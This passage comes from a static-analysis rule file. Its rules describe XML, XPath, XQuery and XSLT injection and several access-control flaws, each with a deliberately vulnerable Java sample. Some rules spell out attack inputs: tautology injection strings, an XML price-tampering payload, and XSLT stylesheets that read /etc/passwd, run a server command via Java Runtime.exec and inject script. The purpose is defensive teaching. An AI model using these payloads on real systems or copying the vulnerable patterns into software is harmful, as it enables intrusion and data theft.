																									   <p>[19]  <em>XML External Entities</em> The Web Application Security Consortium<br></p>
																									   <p>[20]  <em>XML External Entity (XXE) Processing</em> OWASP<br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_xml_injection</key>
		<internalKey>Input Validation and Representation/XML Injection
		</internalKey>
		<name>XML Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Writing unvalidated data into an XML document can allow an attacker to change the structure and contents of the XML.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XML injection occurs when:<br><br>1. Data enters a program from an untrusted source.<br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2. The data is written to an XML document.<br><br>Applications typically use XML to store data or send messages. When used to store data, XML documents are often treated like databases and can potentially contain sensitive information. XML messages are often used in web services and can also be used to transmit sensitive information. XML message can even be used to send authentication credentials.<br><br>The semantics of XML documents and messages can be altered if an attacker has the ability to write raw XML. In the most benign case, an attacker may be able to insert extraneous tags and cause an XML parser to throw an exception. In more nefarious cases of XML injection, an attacker may be able to add XML elements that change authentication credentials or modify prices in an XML e-commerce database. In some cases, XML injection can lead to cross-site scripting or dynamic code evaluation.<br><br><b>Example 1:</b><br><br>Assume an attacker is able to control <code>shoes</code> in following XML.<br><pre><br>&lt;order&gt;<br>   &lt;price&gt;100.00&lt;/price&gt;<br>   &lt;item&gt;shoes&lt;/item&gt;<br>&lt;/order&gt;<br></pre><br><br>Now imagine this XML is included in a back end web service request to place an order for a pair of shoes. Suppose the attacker modifies his request and replaces <code>shoes</code> with <code>shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes</code>. The new XML would look like:<pre><br>&lt;order&gt;   &lt;price&gt;100.00&lt;/price&gt;   &lt;item&gt;shoes&lt;/item&gt;&lt;price&gt;1.00&lt;/price&gt;&lt;item&gt;shoes&lt;/item&gt;&lt;/order&gt;<br></pre><br><br>When using SAX parsers, the value from the second <code>&lt;price&gt;</code> overrides the value from the first <code>&lt;price&gt;</code> tag. This allows the attacker to purchase a pair of $100 shoes for $1.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3810 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3810 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3810 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3810 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 91</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_xpath_injection</key>
		<internalKey>Input Validation and Representation/XPath Injection
		</internalKey>
		<name>XPath Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic XPath query with user input could allow an attacker to modify the statement's meaning. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XPath injection occurs when:<br><br>1.      Data enters a program from an untrusted source.<br><br><br><IfDef var="ConditionalDescriptions"><br> <br></IfDef><br><br>2.      The data used to dynamically construct an XPath query.<br><br><br><br><b>Example 1:</b> The following code dynamically constructs and executes an XPath query that retrieves an e-mail address for a given account ID. The account ID is read from an HTTP request, and is therefore untrusted.<br><br><pre><br>...<br>String acctID = request.getParameter(&quot;acctID&quot;);<br>String query = null;<br>if(acctID != null) {<br>       StringBuffer sb = new StringBuffer(&quot;/accounts/account[acctID='&quot;);<br>       sb.append(acctID);<br>       sb.append(&quot;']/email/text()&quot;);<br>       query = sb.toString();<br>}<br><br>DocumentBuilderFactory domFactory = DocumentBuilderFactory.newInstance();<br>domFactory.setNamespaceAware(true);<br>DocumentBuilder builder = domFactory.newDocumentBuilder();<br>Document doc = builder.parse(&quot;accounts.xml&quot;);<br>XPathFactory factory = XPathFactory.newInstance();<br>XPath xpath = factory.newXPath();<br>XPathExpression expr = xpath.compile(query);<br>Object result = expr.evaluate(doc, XPathConstants.NODESET);<br>...<br></pre><br><br>Under normal conditions, such as searching for an e-mail address that belongs to the account number 1, the query that this code executes will look like the following:<br><br><code>/accounts/account[acctID='1']/email/text()</code><br><br>However, because the query is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>acctID</code> does not contain a single-quote character. If an attacker enters the string <code>1' or '1' = '1</code> for <code>acctID</code>, then the query becomes the following:<br><br><code>/accounts/account[acctID='1' or '1' = '1']/email/text()</code><br><br>The addition of the <code>1' or '1' = '1</code> condition causes the where clause to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br><code>//email/text()</code><br><br>This simplification of the query allows the attacker to bypass the requirement that the query only return items owned by the authenticated user; the query now returns all e-mail addresses stored in the document, regardless of their specified owner.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 643</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>
																									   <p>[18] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>XPath Injection</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_xquery_injection</key>
		<internalKey>Input Validation and Representation/XQuery Injection
		</internalKey>
		<name>XQuery Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Constructing a dynamic XQuery expression with user input could allow an attacker to modify the statement's meaning. 
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XQuery injection occurs when:<br><br>  1.      Data enters a program from an untrusted source.<br><br>  <br>  <IfDef var="ConditionalDescriptions"><br>   <br>  </IfDef><br><br>  2.      The data used to dynamically construct an XQuery expression.<br><br>  <br><br>  <b>Example 1:</b> The following code dynamically constructs and executes an XQuery expression that retrieves an user for a given username and password combination. The username and password are read from an HTTP request, and is therefore untrusted.<br><br>  <pre><br>  ...<br>  XQDataSource xqs = new XQDataSource();<br>  XQConnection conn = xqs.getConnection();<br>  String query = "for \$user in doc(users.xml)//user[username='" + request.getParameter("username") + "'and pass='" + request.getParameter("password") + "'] return \$user";<br><br>  XQPreparedExpression xqpe = conn.prepareExpression(query);<br><br>  XQResultSequence rs = xqpe.executeQuery();<br><br>  ...<br>  </pre><br><br>  Under normal conditions, such as searching for an user with the appropriate username and password, the expression that this code executes will look like the following:<br><br>  <code>for \$user in doc(users.xml)//user[username='test_user' and pass='pass123'] return \$user</code><br><br>  However, because the expression is constructed dynamically by concatenating a constant base query string and a user input string, the query only behaves correctly if <code>username</code> or <code>password</code> does not contain a single-quote character. If an attacker enters the string <code>admin' or 1=1 or ''='</code> for <code>username</code>, then the query becomes the following:<br><br>  <code>for \$user in doc(users.xml)//user[username='admin' or 1=1 or ''='' and password='x' or ''=''] return \$user</code><br><br>  The addition of the <code>admin' or 1=1 or ''='</code> condition causes the XQuery expression to always evaluate to true, so the query becomes logically equivalent to the much simpler query:<br><br>  <code>//user[username='admin']</code><br><br>  This simplification of the query allows the attacker to bypass the requirement that the query match the password; the query now returns the admin user stored in the document, regardless of the entered password.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 652</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>input_validation_and_representation_xslt_injection</key>
		<internalKey>Input Validation and Representation/XSLT Injection
		</internalKey>
		<name>XSLT Injection</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Processing an unvalidated XSL stylesheet can allow an attacker to change the structure and contents of the resultant XML, include arbitrary files from the file system, or execute arbitrary Java code.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  XSLT injection occurs when:<br><br>  1. Data enters a program from an untrusted source.<br>  <br>  <IfDef var="ConditionalDescriptions"><br>   <br>  </IfDef><br><br>  2. The data is written to an XSL stylesheet.<br>  <br><br>  Applications typically use XSL stylesheet to transform XML documents from one format to another.  XSL stylesheets include special functions which enhance the transformation process but introduce additional vulnerabilities if used incorrectly.<br><br>  The semantics of XSL stylesheets and processing can be altered if an attacker has the ability to write XSL elements in a stylesheet. An attacker could alter the output of a stylesheet such that a XSS (cross-site scripting) attack was enabled, expose the contents of local file system resources, or execute arbitrary Java commands.  If the attacker had complete control over the stylesheet submitted to the application, then the attacker could also execute an XXE (Xml eXternal Entity) injection attack.<br><br>  <b>Example 1:</b> Here is some code that is vulnerable to XSLT Injection:<br><br>  <pre><br>  ...<br>  InputStream xmlUrl = Utils.getFromURL(request.getParameter("xmlurl"));<br>  InputStream xsltUrl = Utils.getFromURL(request.getParameter("xslurl"));<br><br>  Source xmlSource = new StreamSource(xmlUrl);<br>  Source xsltSource = new StreamSource(xsltUrl);<br>  Result result = new StreamResult(System.out);<br><br>  TransformerFactory transFact = TransformerFactory.newInstance();<br>  Transformer trans = transFact.newTransformer(xsltSource);<br>  trans.transform(xmlSource, result);<br>  ...<br>  </pre><br><br>  The code above results in three different exploits when the attacker can pass the identified XSL to the XSTL processor:<br><br>  1.  XSS:<br><br>  <code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;script&gt;alert(123)&lt;/script&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br>  </code><br><br>  When the XSL stylesheet is processed, the &lt;script&gt; tag is rendered to the victim's browser allowing a cross-site scripting attack to be performed.<br><br>  2.  Reading of arbitrary files on the server's file system:<br><br>  <code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;xsl:copy-of select="document('/etc/passwd')"/&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br>  </code><br><br>  The above XSL stylesheet will return the contents of the /etc/passwd file.<br><br>  3.  Execution of arbitrary Java code:<br><br>  The XSLT processor has the ability to expose native Java language methods as XSLT functions if they are not disabled.<br><br>  <code><br><br>  &lt;xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime" xmlns:ob="http://xml.apache.org/xalan/java/java.lang.Object"&gt;<br>    &lt;xsl:template match="/"&gt;<br>      &lt;xsl:variable name="rtobject" select="rt:getRuntime()"/&gt;<br>      &lt;xsl:variable name="process" select="rt:exec($rtobject,&apos;ls&apos;)"/&gt;<br>      &lt;xsl:variable name="processString" select="ob:toString($process)"/&gt;<br>      &lt;xsl:value-of select="$processString"/&gt;<br>    &lt;/xsl:template&gt;<br>  &lt;/xsl:stylesheet&gt;<br><br>  </code><br><br>  The above stylesheet will execute the "ls" command run on the server.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A1 Injection</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A1 Injection</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A2 Injection Flaws</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A6 Injection Flaws</em> <br></p>
																									   <p>[5] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[6] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 631</em> <br></p>
																									   <p>[11] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M7 Client Side Injection</em> <br></p>
																									   <p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.3.1.1, Requirement 6.5.2</em> <br></p>
																									   <p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.1</em> <br></p>
																									   <p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.6</em> <br></p>
																									   <p>[16] Standards Mapping - FIPS200 - (FISMA) <em>SI</em> <br></p>
																									   <p>[17] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>SI-10 Information Input Validation (P1)</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>input-validation-and-representation</tag>
	</rule>
	<rule>
		<key>security_features_access_control_amazon_web_services</key>
		<internalKey>Security Features/Access Control/Amazon Web Services
		</internalKey>
		<name>Access Control: Amazon Web Services</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Accessing a SimpleDB database with a user-controlled item name and without proper access control can allow an attacker to view unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Database access control errors occur when:<br><br>1.	Data enters a program from an untrusted source.<br><br><br>2.  The data is used to specify the item name in a SimpleDB access call.<br><br><br><b>Example 1:</b> The following code operates on a database of invoices named after the date of their transaction. The program first authenticates customers and subsequently lets them select from a list previous invoices.<br><br><pre><br>...<br>String selectedInvoice = request.getParameter("invoiceDate");<br>...<br>AmazonSimpleDBClient sdbc = new AmazonSimpleDBClient(appAWSCredentials);<br>GetAttributesResult sdbResult = sdbc.getAttributes(new GetAttributesRequest("invoices", selectedInvoice));<br>...<br></pre><br><br>Although the code in Example 1 generates a list of invoices that belong to the current user, an attacker can bypass this behavior to request any desired invoice. Because the code in this example does not check to ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 566</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[15] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_access_control_android_provider</key>
		<internalKey>Security Features/Access Control/Android Provider
		</internalKey>
		<name>Access Control: Android Provider</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing a SQLite statement that contains a user-controlled primary key can allow an attacker to view unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Access control errors occur in SQLite queries when:<br><br>  1.	Data enters a program from an untrusted source.<br>  <br><br>  2.	The data is used to specify the value of a primary key in a SQLite query.<br>  <br><br>  <b>Example 1:</b> The following code uses a parameterized statement, which escapes metacharacters and prevents query string injection vulnerabilities, to construct and execute a SQLite query that searches for an invoice that matches a user-specified identifier.<br><br>  <pre><br>  ...<br>  id = this.getIntent().getExtras().getInt("id");<br>  cursor = db.query(Uri.parse(invoices), columns, "id = ? ", {id}, null, null, null);<br>  ...<br>  </pre><br><br>  The problem is that the developer has failed to consider all of the possible values of <code>id</code>. Although the query generates a list of invoice identifiers that belong to the current user, an attacker can bypass this behavior to request any desired invoice. Because the code in this example does not ensure that the user has permission to access the requested invoice, it will display any invoice, even if it does not belong to the current user.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A4 Insecure Direct Object Reference</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A4 Insecure Direct Object References</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7]  <em>Android Developers-Reference: SQLite Database</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3510 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3510 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3510 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3510 CAT I</em> <br></p>
																									   <p>[12] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3510 CAT I</em> <br></p>
																									   <p>[13] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 566</em> <br></p>
																									   <p>[14] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[15] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
																									   <p>[16] Standards Mapping - SANS Top 25 2011 - (SANS Top 25 2011) <em>Porous Defenses - CWE ID 863</em> <br></p>
																									   <p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 - (PCI 1.1) <em>Requirement 6.5.2</em> <br></p>
																									   <p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 - (PCI 1.2) <em>Requirement 6.5.4</em> <br></p>
																									   <p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 - (PCI 2.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 - (PCI 3.0) <em>Requirement 6.5.8</em> <br></p>
																									   <p>[21] S. J. Friedl <em>SQL Injection Attacks by Example</em> <br></p>]]></description>
		<severity>MAJOR</severity>
		<tag>security-features</tag>
	</rule>
	<rule>
		<key>security_features_access_control_anonymous_ldap_bind</key>
		<internalKey>Security Features/Access Control/Anonymous LDAP Bind
		</internalKey>
		<name>Access Control: Anonymous LDAP Bind</name>
		<description><![CDATA[<h2>ABSTRACT</h2>
							<p>
							  Without proper access control, executing an LDAP statement that contains a user-controlled value can allow an attacker to access unauthorized records.
							</p>
							<h2>EXPLANATION</h2>
							<p>
							  Executing LDAP queries under an anonymous bind, effectively without authentication, can allow an attacker to abuse a poorly configured LDAP environment.<br><br><b>Example 1:</b> The following code creates the <code>DirContext ctx</code> using an anonymous bind.<br><br><pre><br>...<br>env.put(Context.SECURITY_AUTHENTICATION, "none");<br>DirContext ctx = new InitialDirContext(env);<br>...<br></pre><br><br>All LDAP queries executed against <code>ctx</code> will be performed without authentication and access control. An attacker may be able to manipulate one of these queries in an unexpected way to gain access to records that would otherwise be protected by the directory's access control mechanism.
							</p>
							 								<h2>REFERENCES</h2>
																								   <p>[1] Standards Mapping - OWASP Top 10 2007 - (OWASP 2007) <em>A10 Failure to Restrict URL Access</em> <br></p>
																									   <p>[2] Standards Mapping - OWASP Top 10 2004 - (OWASP 2004) <em>A2 Broken Access Control</em> <br></p>
																									   <p>[3] Standards Mapping - OWASP Top 10 2013 - (OWASP 2013) <em>A7 Missing Function Level Access Control</em> <br></p>
																									   <p>[4] Standards Mapping - OWASP Top 10 2010 - (OWASP 2010) <em>A8 Failure to Restrict URL Access</em> <br></p>
																									   <p>[5] Standards Mapping - FIPS200 - (FISMA) <em>AC</em> <br></p>
																									   <p>[6] Standards Mapping - NIST Special Publication 800-53 Revision 4 - (NIST SP 800-53 Rev.4) <em>AC-3 Access Enforcement (P1)</em> <br></p>
																									   <p>[7] Standards Mapping - Security Technical Implementation Guide Version 3.4 - (STIG 3.4) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[8] Standards Mapping - Security Technical Implementation Guide Version 3.5 - (STIG 3.5) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[9] Standards Mapping - Security Technical Implementation Guide Version 3.6 - (STIG 3.6) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[10] Standards Mapping - Security Technical Implementation Guide Version 3.7 - (STIG 3.7) <em>APP3480.1 CAT I</em> <br></p>
																									   <p>[11] Standards Mapping - Security Technical Implementation Guide Version 3 - (STIG 3) <em>APP3480.1 CAT II</em> <br></p>
																									   <p>[12] Standards Mapping - Common Weakness Enumeration - (CWE) <em>CWE ID 285</em> <br></p>
																									   <p>[13] Standards Mapping - Web Application Security Consortium 24 + 2 - (WASC 24 + 2) <em>Insufficient Authorization</em> <br></p>
																									   <p>[14] Standards Mapping - OWASP Mobile Top 10 Risks 2014 - (OWASP Mobile 2014) <em>M5 Poor Authorization and Authentication</em> <br></p>
